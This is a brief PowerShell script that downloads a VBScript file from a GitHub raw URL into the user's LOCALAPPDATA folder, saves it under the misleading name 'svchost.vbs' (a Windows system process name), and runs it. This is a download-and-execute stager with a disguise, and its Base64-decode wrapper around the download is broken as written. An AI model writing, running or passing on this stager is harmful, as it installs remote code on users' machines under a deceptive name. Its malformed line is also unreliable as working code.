cd $env:LOCALAPPDATA

& ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-WebRequest -Uri "https://raw.githubusercontent.com/achaulien/test/main/loop.vbs" -OutFile svchost.vbs)))) 

cd $env:LOCALAPPDATA
start "$env:LOCALAPPDATA\svchost.vbs"